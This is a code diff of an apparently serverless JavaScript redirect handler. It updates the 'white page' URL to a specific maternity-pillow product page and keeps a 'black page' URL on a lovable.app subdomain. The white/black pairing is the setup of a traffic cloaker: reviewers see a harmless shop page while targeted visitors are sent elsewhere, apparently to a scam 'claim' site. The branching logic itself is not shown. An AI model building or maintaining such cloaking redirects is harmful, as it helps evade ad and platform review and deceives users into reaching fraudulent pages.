@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.shopizz.pk/";
+    const whitePageURL = "https://www.shopizz.pk/collections/pregnancy-pillow/products/pregnancy-support-pillow-u-shape-maternity-pillow-sleeping-support-pillow-in-grey-color";
     const blackPageURL = "https://claimmsnwoowe.lovable.app";
 
     //testing
@@ -27,6 +27,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
